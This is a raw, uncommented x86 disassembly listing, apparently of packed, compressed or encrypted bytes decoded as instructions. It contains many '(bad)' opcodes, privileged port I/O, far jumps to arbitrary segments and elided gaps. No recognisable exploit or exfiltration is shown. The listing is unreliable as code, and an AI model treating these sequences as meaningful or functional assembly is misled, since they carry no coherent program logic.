  422d06:	push   ebp
  422d07:	mov    bl,0xe9
  422d09:	pusha  
  422d0a:	mov    ds:0xdfb811e0,eax
  422d0f:	inc    ecx
  422d10:	push   eax
  422d11:	in     al,0x2a
  422d13:	xchg   edx,eax
  422d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d15:	pop    ss
  422d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d17:	(bad)  
  422d18:	fwait
  422d19:	xor    DWORD PTR ds:0x5af7838b,0x5198a88c
  422d23:	sbb    al,0x4d
  422d25:	sub    al,0x42
  422d27:	push   ebx
  422d28:	adc    eax,0xb215f08b
  422d2d:	das    
  422d2e:	dec    eax
  422d2f:	push   ss
  422d30:	test   esi,edi
  422d32:	lea    esi,[ebp+0x52]
  422d35:	nop
  422d36:	jmp    0x5d77494f
  422d3b:	mov    ebx,0xaea84baf
  422d40:	fmul   DWORD PTR [edi*4-0x5bfe341]
  422d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d48:	xlat   BYTE PTR ds:[ebx]
  422d49:	add    eax,0x2eab60dd
  422d4e:	shr    BYTE PTR [edi],0x4d
  422d51:	aas    
  422d52:	(bad)  
  422d53:	std    
  422d54:	inc    edx
  422d55:	iret   
  422d56:	dec    edi
  422d57:	xor    eax,0x2a9a61ae
  422d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d5d:	fnstenv [esi-0x71]
  422d60:	test   DWORD PTR [eax],0xd7bdf090
  422d66:	sub    eax,0xea8edbc
  422d6b:	xchg   ebp,eax
  422d6c:	push   edx
  422d6d:	cdq    
	...
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    eax,DWORD PTR [edx]
  422de3:	js     0x422e42
  422de5:	or     eax,0x17667
  422dea:	add    BYTE PTR [ecx],al
  422dec:	add    BYTE PTR [eax],al
  422dee:	dec    eax
  422def:	inc    edi
  422df0:	jl     0x422d92
  422df2:	leave  
  422df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422df4:	xchg   ecx,eax
  422df5:	push   ss
  422df6:	call   0xa32b28d0
  422dfb:	mov    WORD PTR [esi-0x36d4b693],ss
  422e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e02:	jns    0x422d8d
  422e04:	es (bad) 
  422e06:	jmp    0x422e82
  422e08:	je     0x422e78
  422e0a:	das    
  422e0b:	xor    BYTE PTR [edx-0x7e169fa6],bh
  422e11:	pop    ebp
  422e12:	fbld   TBYTE PTR [ebx-0x3c]
  422e15:	call   FWORD PTR [eax]
  422e17:	js     0x422de0
  422e19:	push   0x8bcb4a17
  422e1e:	fs retf 0x7e37
  422e22:	pop    ecx
  422e23:	mov    ebp,0x602a9143
  422e28:	retf   0x4c36
  422e2b:	sbb    al,0xbe
  422e2d:	jno    0x422e1f
  422e2f:	imul   ecx,DWORD PTR [edx+0x64],0xffffffa8
  422e33:	in     eax,dx
  422e34:	arpl   dx,bx
  422e36:	sbb    BYTE PTR [edi],ch
  422e38:	pop    esp
  422e39:	ins    DWORD PTR es:[edi],dx
  422e3a:	sar    DWORD PTR [eax+0x35733bdb],0xb9
  422e41:	mov    ah,0x76
  422e43:	xchg   edi,edi
  422e45:	xor    DWORD PTR [ebp+0x6e],esp
  422e48:	xor    DWORD PTR [edx],esp
  422e4a:	jge    0x422e3a
  422e4c:	sar    BYTE PTR [ebp+0x10],1
  422e4f:	std    
  422e50:	xor    al,0x65
  422e52:	dec    edi
  422e53:	mov    WORD PTR [ecx-0x4e3d76ab],?
  422e59:	pop    ecx
  422e5a:	js     0x422e14
  422e5c:	ret    
  422e5d:	daa    
  422e5e:	mov    eax,ds:0xf030fd35
  422e63:	test   BYTE PTR [esi+0x6d8c6f05],al
  422e69:	sbb    cl,BYTE PTR [ebp-0x1cb70618]
  422e6f:	push   ebp
  422e70:	jnp    0x422eab
  422e72:	mov    edx,0x1529fa7
  422e77:	jnp    0x422e0d
  422e79:	adc    eax,0x1191f9c2
  422e7e:	lods   al,BYTE PTR ds:[esi]
  422e7f:	xchg   ebx,edx
  422e81:	add    eax,0x2eed77f9
  422e86:	xor    eax,0xa8f68121
  422e8b:	sbb    eax,0xd51fcef9
  422e90:	shl    esi,0x61
  422e93:	in     eax,0x1
  422e95:	or     cl,BYTE PTR [edx+ebp*1+0x7e8e85e4]
  422e9c:	leave  
  422e9d:	sbb    esi,esi
  422e9f:	add    eax,0xc35e4ecf
  422ea4:	jno    0x422ed3
  422ea6:	xor    cl,BYTE PTR [ebx]
  422ea8:	push   ecx
  422ea9:	hlt    
  422eaa:	clc    
  422eab:	sub    eax,0x61d21faf
  422eb0:	arpl   WORD PTR [ebp-0x34],si
  422eb3:	(bad)  
  422eb4:	push   0xffffff99
  422eb6:	pop    eax
  422eb7:	xor    DWORD PTR [esi-0x38],esp
  422eba:	jmp    0x3985:0xc26a347a
  422ec1:	add    eax,DWORD PTR ds:0x986c42c
  422ec7:	xchg   BYTE PTR [ebx+0x7b52dfb1],dh
  422ecd:	popa   
  422ece:	sub    eax,0x2d6c0723
  422ed3:	out    dx,al
  422ed4:	aad    0x52
  422ed6:	nop
  422ed7:	push   esp
  422ed8:	sbb    al,0x3
  422eda:	ds mov edi,0xd0f48639
  422ee0:	or     edi,esi
  422ee2:	or     al,0x0
  422ee4:	adc    BYTE PTR [eax+0x56],dl
  422ee7:	push   0x2b0c4578
  422eec:	xor    eax,0x3a
	...
  422f55:	add    BYTE PTR [ebx-0x21e677ab],al
  422f5b:	fst    QWORD PTR [ebx+0x33b808df]
  422f61:	retf   0x1159
  422f64:	(bad)  
  422f65:	mov    esp,DWORD PTR [edi+0x77]
  422f68:	add    DWORD PTR [eax],eax
  422f6a:	add    BYTE PTR [ecx],al
  422f6c:	add    BYTE PTR [eax],al
  422f6e:	add    ecx,DWORD PTR [edx]
  422f70:	rol    DWORD PTR [edx],0x42
  422f73:	mov    bh,0xd4
  422f75:	push   ss
  422f76:	fld    QWORD PTR [edi]
  422f78:	xor    BYTE PTR [esi-0x35],bl
  422f7b:	loopne 0x422f56
  422f7d:	enter  0x84da,0xa7
  422f81:	sbb    bh,dl
  422f83:	dec    esp
  422f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f85:	cwde   
  422f86:	push   0xb
  422f88:	dec    eax
  422f89:	ret    0x4435
  422f8c:	loop   0x422f31
  422f8e:	jg     0x422f68
  422f90:	sbb    BYTE PTR [ebp-0x6df8fd56],bl
  422f96:	xor    BYTE PTR [ebp+0x65131c55],dl
  422f9c:	or     al,0xba
  422f9e:	push   cs
  422f9f:	cmp    al,0x3b
  422fa1:	xor    al,0xb1
  422fa3:	xor    ah,ah
  422fa5:	or     BYTE PTR [edx+0x6],bh
  422fa8:	push   ebx
  422fa9:	xchg   edx,eax
  422faa:	(bad)  
  422fab:	fisub  DWORD PTR [eax-0x7f87857c]
  422fb1:	inc    edx
  422fb2:	jae    0x422fb9
  422fb4:	mov    bl,0x35
  422fb6:	int    0x14
  422fb8:	popa   
  422fb9:	shl    DWORD PTR [ecx+0xc],0x66
  422fbd:	jp     0x423039
  422fbf:	jbe    0x422fff
  422fc1:	jle    0x422fcf
  422fc3:	cli    
  422fc4:	fucomip st,st(3)
  422fc6:	scas   eax,DWORD PTR es:[edi]
  422fc7:	mov    edx,0x2cf5de2d
  422fcc:	xchg   DWORD PTR [edi],ecx
  422fce:	xchg   ebp,esp
  422fd0:	push   ss
  422fd1:	int3   
  422fd2:	in     eax,0x30
  422fd4:	out    0xaa,eax
  422fd6:	into   
  422fd7:	outs   dx,BYTE PTR ds:[esi]
  422fd8:	and    bh,BYTE PTR [ebp+0x4f]
  422fdb:	or     BYTE PTR [ebp-0x22e81fb7],ah
  422fe1:	(bad)  
  422fe2:	xor    bh,cl
  422fe4:	push   ss
  422fe5:	jp     0x422f86
  422fe7:	cld    
  422fe8:	adc    DWORD PTR [eax+0x21ddaefb],eax
  422fee:	aaa    
  422fef:	sub    eax,0xcc6b7059
  422ff4:	sub    eax,0x1ee385ea
  422ff9:	inc    edi
  422ffa:	pop    es
  422ffb:	mov    bl,0xdd
  422ffd:	mov    eax,ds:0xeb4b38ea
  423002:	clc    
  423003:	add    al,0xf4
  423005:	mov    esp,0xb42d089c
  42300a:	pop    ebp
  42300b:	(bad)  
  42300c:	std    
  42300d:	dec    edx
  42300e:	or     DWORD PTR [esi-0x78],edi
  423011:	je     0x423084
  423013:	data16 jns 0x422fa9
  423016:	xchg   ecx,eax
  423017:	(bad)  
  423018:	jl     0x422fc5
  42301a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42301b:	mov    eax,ds:0x38f8669a
  423020:	and    DWORD PTR [ebp+0x4866e235],0x28036d73
  42302a:	sub    DWORD PTR [ebx-0x2fd933d],0x62aeddb2
  423034:	xchg   edx,eax
  423035:	test   ebp,edx
  423037:	mov    eax,ds:0x374bdb00
  42303c:	fsub   QWORD PTR [ebx+ecx*4]
  42303f:	sub    edx,esi
  423041:	call   FWORD PTR [esi+0x457acf11]
  423047:	add    bl,BYTE PTR [edi+0x1aa662c2]
  42304d:	stc    
  42304e:	adc    BYTE PTR [edx+edi*4+0x6daf912a],dh
  423055:	sub    al,0xd7
  423057:	pop    eax
  423058:	adc    cl,BYTE PTR [eax]
  42305a:	or     al,0x76
  42305c:	add    edx,DWORD PTR [ebp+eiz*1-0x55566092]
  423063:	pop    edi
  423064:	jg     0x423006
  423066:	in     eax,dx
  423067:	mov    ah,0x2a
  423069:	add    al,0x73
  42306b:	sub    esi,DWORD PTR [eax+esi*1+0x0]
	...
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [ebx+edi*2+0x671b099d],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR [ebp-0x5135dc75],cl
  4230f3:	in     eax,0x1d
  4230f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230f6:	jg     0x42315a
  4230f8:	dec    ebx
  4230f9:	jnp    0x423148
  4230fb:	imul   ebp,DWORD PTR [edi],0x8976ff09
  423101:	mov    cl,0x48
  423103:	ins    BYTE PTR es:[edi],dx
  423104:	loop   0x42311f
  423106:	or     al,0x18
  423108:	mov    dh,0x2f
  42310a:	push   0x752372d5
  42310f:	jb     0x4230e5
  423111:	shr    DWORD PTR [ecx+0x19],cl
  423114:	jbe    0x423140
  423116:	out    0x1a,al
  423118:	pop    edi
  423119:	cli    
  42311a:	jle    0x4230da
  42311c:	clc    
  42311d:	icebp  
  42311e:	stos   DWORD PTR es:[edi],eax
  42311f:	sub    BYTE PTR fs:[edi],ah
  423122:	push   ss
  423123:	sub    al,0x3c
  423125:	in     al,dx
  423126:	hlt    
  423127:	cmp    al,0x2e
  423129:	mov    esp,0x309be696
  42312e:	mov    esi,0x15c92536
  423133:	add    ah,BYTE PTR [ebx+esi*2+0x3f]
  423137:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  423139:	bound  esp,QWORD PTR [ecx-0x468b9cea]
  42313f:	push   esp
  423140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423141:	stos   DWORD PTR es:[edi],eax
  423142:	shl    bl,1
  423144:	ins    BYTE PTR es:[edi],dx
  423145:	inc    eax
  423146:	pushf  
  423147:	push   es
  423148:	inc    eax
  423149:	imul   eax,DWORD PTR [eax+0x31],0xffffffff
  42314d:	dec    ebp
  42314e:	mov    ebx,0x3cc7b504
  423153:	or     al,0x6
  423155:	cmp    BYTE PTR [edx+0x2087d2d5],bl
  42315b:	fist   DWORD PTR [ecx-0x57aae299]
  423161:	mov    ds:0x6f5e23e4,eax
  423167:	xchg   esi,eax
  423168:	xchg   ebp,eax
  423169:	lock inc ebx
  42316b:	lahf   
  42316c:	shl    DWORD PTR [ecx+0x51],1
  42316f:	add    DWORD PTR [esi+0x79e165fb],edi
  423175:	ds lahf 
  423177:	push   ebp
  423178:	(bad)  
  423179:	sar    DWORD PTR [edx],1
  42317b:	rcl    ebx,cl
  42317d:	neg    DWORD PTR [ebp+0x39adc871]
  423183:	dec    ebx
  423184:	sbb    al,0xb
  423186:	test   al,0xbe
  423188:	int3   
  423189:	gs mov ch,0x8c
  42318c:	cmp    al,0x84
  42318e:	dec    esp
  42318f:	(bad)  
  423190:	xchg   ecx,eax
  423191:	mov    bh,0x26
  423193:	push   0xffffffa6
  423195:	call   0x18ccdd70
  42319a:	adc    eax,0xd69f856f
  42319f:	(bad)  
  4231a0:	push   ebp
  4231a1:	cli    
  4231a2:	pop    esi
  4231a3:	pop    esp
  4231a4:	out    dx,eax
  4231a5:	mov    esp,0xc79a1183
  4231aa:	enter  0xd92f,0x69
  4231ae:	ja     0x423150
  4231b0:	mov    esi,0x7bd70ca
  4231b5:	mov    ah,0x16
  4231b7:	inc    ebp
  4231b8:	xlat   BYTE PTR ds:[ebx]
  4231b9:	imul   edi,DWORD PTR [edx+eiz*8],0x41d8ecea
  4231c0:	loopne 0x42316a
  4231c2:	aas    
  4231c3:	outs   dx,DWORD PTR ds:[esi]
  4231c4:	test   al,0xf5
  4231c6:	mov    edx,0x748cd26d
  4231cb:	mov    esi,0xb76bfdc1
  4231d0:	sbb    DWORD PTR [ebp+0x5f],ecx
  4231d3:	into   
  4231d4:	in     al,dx
  4231d5:	sti    
  4231d6:	(bad)  
  4231d8:	arpl   WORD PTR [ebp-0x4d801c73],ax
  4231de:	sub    DWORD PTR [ecx+0x3c],esi
  4231e1:	add    ch,ch
  4231e3:	jle    0x423237
  4231e5:	push   edx
  4231e6:	jo     0x423229
  4231e8:	lahf   
  4231e9:	fistp  WORD PTR [edx]
  4231eb:	jb     0x423179
  4231ed:	sbb    eax,DWORD PTR [eax]
	...
  423253:	add    BYTE PTR [eax],al
  423255:	add    BYTE PTR [ecx-0xf],bh
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x3bf8f451],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    BYTE PTR ds:0x4aba296f,ah
  423273:	mov    ecx,eax
  423275:	pop    edx
  423276:	xor    DWORD PTR [edi+0x27],edx
  423279:	lock out dx,al
  42327b:	mov    ds:0x5c863cbe,eax
  423280:	fisub  WORD PTR [ebp+0x7c840ac1]
  423286:	mov    edx,0xdbab6c24
  42328b:	mov    BYTE PTR [ecx-0x472f7c00],0x21
  423292:	mov    bl,0x23
  423294:	jno    0x423263
  423296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423297:	or     ch,BYTE PTR [ecx+0x60]
  42329a:	mov    edi,DWORD PTR cs:[eax]
  42329d:	dec    ebx
  42329e:	ins    DWORD PTR es:[edi],dx
  42329f:	mov    ebx,0x6c79bea5
  4232a4:	adc    cl,0xa5
  4232a7:	sbb    DWORD PTR [ecx+0x2c],ecx
  4232aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ab:	fst    DWORD PTR [esi]
  4232ad:	push   ds
  4232ae:	push   esp
  4232af:	fwait
  4232b0:	das    
  4232b1:	xlat   BYTE PTR ds:[ebx]
  4232b2:	scas   al,BYTE PTR es:[edi]
  4232b3:	sbb    BYTE PTR [eax+0x21],dh
  4232b6:	jmp    0x87af:0xb31f52ab
  4232bd:	add    BYTE PTR [esi-0x61],cl
  4232c0:	cmp    BYTE PTR [ebx+0x74],0x9b
  4232c4:	imul   ecx,DWORD PTR ds:0x450ee52,0x69f84732
  4232ce:	jne    0x4232cc
  4232d0:	mov    edx,0xa23aee2f
  4232d5:	shl    cl,0x1d
  4232d8:	mov    fs,ecx
  4232da:	cmp    eax,0x920b2c24
  4232df:	add    edi,ebp
  4232e1:	(bad)
  4232e5:	mov    esi,DWORD PTR [eax]
  4232e7:	xchg   ecx,eax
  4232e8:	cdq    
  4232e9:	mov    ebx,0xe711db8b
  4232ee:	mov    dl,0x3d
  4232f0:	sub    edx,DWORD PTR [edi]
  4232f2:	fbld   TBYTE PTR [esi]
  4232f4:	cdq    
  4232f5:	adc    bl,BYTE PTR [eax+0x23dce138]
  4232fb:	jo     0x423353
  4232fd:	sbb    DWORD PTR [ecx],0x65
  423300:	sbb    dh,BYTE PTR [esi-0x77c9b843]
  423306:	xlat   BYTE PTR ds:[ebx]
  423307:	push   ds
  423308:	(bad)  
  42330a:	cmp    dl,bl
  42330c:	(bad)  
  42330d:	push   edi
  42330e:	pushf  
  42330f:	out    0xb1,eax
  423311:	mov    edi,0x69b3cd77
  423316:	pop    edi
  423317:	sbb    eax,DWORD PTR [edx+0x67]
  42331a:	xchg   edi,eax
  42331b:	pop    esi
  42331c:	ins    BYTE PTR es:[edi],dx
  42331d:	test   al,0x1a
  42331f:	into   
  423320:	jb     0x42337a
  423322:	pushf  
  423323:	mov    ds:0x290a7ddd,eax
  423328:	out    dx,eax
  423329:	fld    TBYTE PTR [ebx+0x6e]
  42332c:	add    DWORD PTR [ebx+ebp*1-0x15],0x94efeb02
  423334:	xor    DWORD PTR [edx-0x4],ebp
  423337:	arpl   WORD PTR [eax],dx
  423339:	das    
  42333a:	xor    edi,DWORD PTR [edx-0x5b]
  42333d:	cmp    al,0xaa
  42333f:	xor    eax,0xbc853adc
  423344:	pusha  
  423345:	or     al,0x47
  423347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423348:	dec    edi
  423349:	stos   DWORD PTR es:[edi],eax
  42334a:	hlt    
  42334b:	mov    al,0x49
  42334d:	push   ecx
  42334e:	pop    ds
  42334f:	arpl   WORD PTR [edx+eax*1+0x18b3bd81],sp
  423356:	jl     0x42330b
  423358:	pop    ebp
  423359:	jg     0x423389
  42335b:	cmp    al,0x2
  42335d:	xchg   ebx,eax
  42335e:	pop    esi
  42335f:	aaa    
  423360:	sahf   
  423361:	inc    esp
  423362:	stc    
  423363:	or     al,0x91
  423365:	sbb    al,0x68
  423367:	mov    ds:0xbc1eb5c5,al
  42336c:	cmp    DWORD PTR [ebp+0x0],ebp
	...
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0xa9ef0f44
  4233e4:	int3   
  4233e5:	sti    
  4233e6:	addr16 jp 0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    bl,bl
  4233ef:	and    eax,0x18fe4758
  4233f4:	jle    0x4233c6
  4233f6:	sahf   
  4233f7:	mov    ds:0x42b3e0bc,al
  4233fc:	sbb    ah,BYTE PTR [ebp-0x6065fbb1]
  423402:	test   al,0x4f
  423404:	jnp    0x42338a
  423406:	mov    edx,0xe60e2bc8
  42340b:	sar    DWORD PTR [ecx],cl
  42340d:	clc    
  42340e:	pop    edx
  42340f:	mov    edi,0xd0096067
  423414:	xchg   ebx,eax
  423415:	sub    DWORD PTR [edx-0x1],0x80dda230
  42341c:	pop    ss
  42341d:	push   eax
  42341e:	loope  0x42348c
  423420:	shl    DWORD PTR [edx],1
  423422:	addr16 add al,0x40
  423425:	sahf   
  423426:	jno    0x423460
  423428:	push   ds
  423429:	stos   BYTE PTR es:[edi],al
  42342a:	pusha  
  42342b:	push   ecx
  42342c:	mov    ah,0x94
  42342e:	fdivp  st(7),st
  423430:	jns    0x42346e
  423432:	or     DWORD PTR [eax+0x44],eax
  423435:	mov    bh,0x9f
  423437:	mov    edx,0xcc3892c6
  42343c:	js     0x4233e5
  42343e:	inc    esp
  42343f:	in     eax,0x43
  423441:	leave  
  423442:	cmc    
  423443:	pop    ebx
  423444:	push   ecx
  423445:	fisub  DWORD PTR [ebp+0x64]
  423448:	out    dx,al
  423449:	mov    edx,0xb189a60a
  42344e:	push   ds
  42344f:	dec    esp
  423450:	out    0x0,eax
  423452:	lods   eax,DWORD PTR ds:[esi]
  423453:	inc    edx
  423454:	out    dx,al
  423455:	jl     0x423410
  423457:	jmp    0x4234a0
  423459:	mov    BYTE PTR [ebp-0x6616f21f],al
  42345f:	fstp   QWORD PTR [ebx-0x43d95f78]
  423465:	(bad)  
  423466:	sub    BYTE PTR [ebp+0x53ef208d],bh
  42346c:	cmp    al,0x50
  42346e:	jnp    0x42346c
  423470:	jnp    0x423445
  423472:	or     BYTE PTR [edx],ah
  423474:	js     0x42347a
  423476:	ret    
  423477:	rcr    al,1
  423479:	outs   dx,DWORD PTR ds:[esi]
  42347a:	push   ss
  42347b:	dec    ax
  42347d:	or     BYTE PTR [ebp+0x4f],al
  423480:	mov    esi,0x3e516ead
  423485:	fld    QWORD PTR [eax-0xb6bc281]
  42348b:	(bad)  
  42348c:	cmc    
  42348d:	mov    eax,0xfb677f0c
  423493:	ds jle 0x423515
  423496:	js     0x423489
  423498:	lahf   
  423499:	inc    ah
  42349b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42349c:	adc    bl,BYTE PTR [esi+ecx*2-0x33b3873]
  4234a3:	adc    al,0xc1
  4234a5:	(bad)  [ebx+0x76]
  4234a8:	dec    edx
  4234a9:	hlt    
  4234aa:	push   0xffffffb6
  4234ac:	xor    eax,DWORD PTR [ebp-0x61509686]
  4234b2:	pop    esp
  4234b3:	mov    WORD PTR [eax+0x70ec7331],gs
  4234b9:	ins    BYTE PTR es:[edi],dx
  4234ba:	jp     0x4234b8
  4234bc:	pop    ss
  4234bd:	(bad)  
  4234be:	jmp    FWORD PTR [ebx]
  4234c0:	and    al,0xad
  4234c2:	(bad)  
  4234c4:	pushf  
  4234c5:	mov    dl,0xa4
  4234c7:	pop    ds
  4234c8:	(bad)  [esi+0x5e3e3498]
  4234ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234cf:	das    
  4234d0:	xor    eax,0xc549fa40
  4234d5:	xor    ch,BYTE PTR [esi]
  4234d7:	mov    esi,DWORD PTR [ebx-0x71582f65]
  4234dd:	lds    edi,FWORD PTR [ebx]
  4234df:	dec    edi
  4234e0:	add    BYTE PTR [ebp-0x299c0829],dl
  4234e6:	ss inc esi
  4234e8:	in     al,dx
  4234e9:	test   ecx,ebp
  4234eb:	xlat   BYTE PTR ds:[ebx]
  4234ec:	stos   BYTE PTR es:[edi],al
  4234ed:	out    0x0,al
	...
  423553:	add    BYTE PTR [eax],al
  423555:	add    al,al
  423557:	mov    al,0x45
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	jne    0x42355b
  42355c:	jmp    0xae1f:0xadf467bf
  423563:	scas   eax,DWORD PTR es:[edi]
  423564:	jge    0x423523
  423566:	addr16 jnp 0x42356a
  423569:	add    BYTE PTR [eax],al
  42356b:	add    DWORD PTR [eax],eax
  42356d:	add    BYTE PTR [ecx+0x35a5e702],dh
  423573:	inc    esi
  423574:	cmp    eax,0xe3952661
  423579:	repnz mov esp,0x8ace8ad6
  42357f:	cmc    
  423580:	into   
  423581:	pop    edx
  423582:	ret    0x3976
  423585:	(bad)  
  423586:	and    ebp,DWORD PTR [eax-0x18]
  423589:	sti    
  42358a:	cmp    bl,BYTE PTR [eax]
  42358c:	arpl   WORD PTR [ecx],cx
  42358e:	xlat   BYTE PTR ds:[ebx]
  42358f:	lahf   
  423590:	arpl   WORD PTR [edx+ebp*8],dx
  423593:	add    al,0xd0
  423595:	into   
  423596:	push   0xfe068d5f
  42359b:	xchg   ebp,eax
  42359c:	jae    0x42357e
  42359e:	mov    ecx,0xa21c8ad7
  4235a3:	mov    BYTE PTR [edi+esi*2-0x41],dh
  4235a7:	cwde   
  4235a8:	mov    edi,DWORD PTR [esi-0x6f4be4c2]
  4235ae:	ins    DWORD PTR es:[edi],dx
  4235af:	mov    ch,0x72
  4235b1:	or     esp,0xffffffee
  4235b4:	xchg   edi,eax
  4235b5:	jb     0x4235bc
  4235b7:	mov    fs,WORD PTR [ebx]
  4235b9:	mov    cl,0x1b
  4235bb:	cld    
  4235bc:	mov    ecx,0x23917a8e
  4235c1:	xchg   BYTE PTR [edi],dh
  4235c3:	lods   eax,DWORD PTR ds:[esi]
  4235c4:	adc    BYTE PTR [ebx+0x23],ch
  4235c7:	xchg   esi,eax
  4235c8:	aad    0x4e
  4235ca:	(bad)  
  4235cb:	fiadd  WORD PTR [edi+edx*4]
  4235ce:	hlt    
  4235cf:	sub    bh,cl
  4235d1:	cmp    al,0x9a
  4235d3:	bound  edx,QWORD PTR [eax+0x13]
  4235d6:	mov    BYTE PTR [edi+0x4618fbc1],bh
  4235dc:	or     BYTE PTR [edi+0x764035d3],al
  4235e2:	(bad)  
  4235e3:	cmc    
  4235e4:	cmp    dl,BYTE PTR [edi+0x3e]
  4235e7:	jmp    0xe98dc645
  4235ec:	pop    DWORD PTR [edx-0x9]
  4235ef:	xchg   ebx,eax
  4235f0:	dec    edi
  4235f1:	test   ah,dl
  4235f3:	push   eax
  4235f4:	fs push es
  4235f6:	nop
  4235f7:	lahf   
  4235f8:	outs   dx,DWORD PTR ds:[esi]
  4235f9:	test   bl,bh
  4235fb:	dec    edx
  4235fc:	mov    eax,0xdb4b53f0
  423601:	repz adc DWORD PTR [ebp-0x75],esi
  423605:	xchg   edi,eax
  423606:	out    dx,al
  423607:	repz and al,BYTE PTR [eax-0x27]
  42360b:	push   ecx
  42360c:	sbb    ecx,DWORD PTR [edi]
  42360e:	sub    edi,DWORD PTR [eax]
  423610:	and    dh,BYTE PTR [edi-0x510e950b]
  423616:	cmp    ebp,esi
  423618:	arpl   WORD PTR [eax],ax
  42361a:	cmc    
  42361b:	push   ebx
  42361c:	xor    BYTE PTR [ebx],bl
  42361e:	mov    ecx,ecx
  423620:	rcl    BYTE PTR ds:0xaf6258f6,cl
  423626:	push   es
  423627:	cmp    al,0xc8
  423629:	add    eax,0x33d97de8
  42362e:	xlat   BYTE PTR ds:[ebx]
  42362f:	xchg   DWORD PTR [ebx+0x79],eax
  423632:	out    dx,eax
  423633:	stos   BYTE PTR es:[edi],al
  423634:	inc    esp
  423635:	mov    ch,bh
  423637:	sar    BYTE PTR [edx-0x31],0x20
  42363b:	jns    0x423616
  42363d:	retf   
  42363e:	dec    ecx
  42363f:	test   eax,0x6edcc2c9
  423644:	repz mov bh,0x2f
  423647:	in     al,0x42
  423649:	fisttp QWORD PTR [eax-0x1f2e75d4]
  42364f:	or     edx,ebx
  423651:	jp     0x4236c7
  423653:	mov    dh,0x8f
  423655:	jmp    0xe29cc615
  42365a:	or     BYTE PTR [eax+0x3f998d57],cl
  423660:	test   BYTE PTR [edi-0x75bdbef6],0x29
  423667:	inc    eax
  423668:	cmp    edx,DWORD PTR [esi]
  42366a:	sub    eax,0x767c7d
	...
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x55fa6e13
  4236e5:	and    DWORD PTR [edi+0x7c],0x1000001
  4236ec:	add    BYTE PTR [eax],al
  4236ee:	push   esi
  4236ef:	test   eax,0x60903fcd
  4236f4:	sahf   
  4236f5:	push   ebx
  4236f6:	jns    0x4236aa
  4236f8:	inc    ebp
  4236f9:	ja     0x42374b
  4236fb:	xor    eax,0x645488e6
  423700:	div    DWORD PTR [eax+0x50d389a2]
  423706:	in     al,dx
  423707:	add    esi,ecx
  423709:	push   ebx
  42370a:	inc    esi
  42370b:	fbstp  TBYTE PTR [ebp+edi*8-0x29]
  42370f:	in     al,0x90
  423711:	mov    edx,0xa7a6e702
  423716:	cdq    
  423717:	dec    DWORD PTR [edx+0x1a5e9231]
  42371d:	lahf   
  42371e:	xchg   edx,eax
  42371f:	out    0x2,al
  423721:	loop   0x4236b4
  423723:	jecxz  0x4236bc
  423725:	retf   0x3524
  423728:	adc    bl,dl
  42372a:	xor    al,0x8d
  42372c:	(bad)  
  42372d:	mov    ebx,0x51b291f4
  423732:	sbb    eax,0x115e4a50
  423737:	jns    0x423727
  423739:	lahf   
  42373a:	leave  
  42373b:	imul   edi,DWORD PTR [esi+ebp*4+0x56],0xa17ffc6f
  423743:	dec    esi
  423744:	loop   0x4236e1
  423746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423747:	out    0xc6,al
  423749:	sbb    esp,esi
  42374b:	in     al,dx
  42374c:	jl     0x4237bb
  42374e:	gs jne 0x4236e5
  423751:	push   0xffffffb7
  423753:	mov    eax,ds:0x6db0865a
  423758:	sahf   
  423759:	and    al,0x3
  42375b:	repnz inc esi
  42375d:	adc    esp,DWORD PTR [esi]
  42375f:	stc    
  423760:	inc    edi
  423761:	pop    ss
  423762:	mov    ebp,0x8f441fc7
  423767:	sub    al,0xa6
  423769:	stos   DWORD PTR es:[edi],eax
  42376a:	ins    BYTE PTR es:[edi],dx
  42376b:	push   0xd9dd4a1e
  423770:	mov    ecx,fs
  423772:	fadd   DWORD PTR [edi+0x74]
  423775:	push   edi
  423776:	or     bl,BYTE PTR [ebx-0x53781c74]
  42377c:	cdq    
  42377d:	cmp    dh,BYTE PTR [ecx]
  42377f:	mov    DWORD PTR ds:0x20bab817,eax
  423785:	xor    eax,0xb6d1ddbb
  42378a:	add    BYTE PTR [ebx],0xdd
  42378d:	jnp    0x4237f1
  42378f:	fsubr  st(2),st
  423791:	xor    DWORD PTR [ecx-0x7f],0xc8c526ba
  423798:	push   0x27
  42379a:	and    eax,0x4fcba3b1
  42379f:	call   0xa5c7:0x818caab
  4237a6:	cmp    esi,esp
